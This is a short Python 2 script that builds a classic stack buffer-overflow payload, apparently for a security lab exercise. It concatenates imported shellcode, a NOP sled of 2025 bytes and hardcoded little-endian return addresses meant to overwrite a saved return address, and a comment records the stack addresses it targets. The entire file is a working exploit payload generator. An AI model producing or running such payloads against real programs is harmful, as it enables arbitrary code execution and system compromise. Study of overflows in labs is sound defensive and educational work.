from shellcode import shellcode
strfill = ""
for i in range(0,2025):
	strfill = strfill + chr(0x90)
# addr of my shellcode : 0xbffef1c8, addr of where ret addr is located : 0xbffef1c8 + 2056, bffef9d0
pa = ("\xc8\xf1\xfe\xbf\xdc\xf9\xfe\xbf") 
print shellcode + strfill + pa
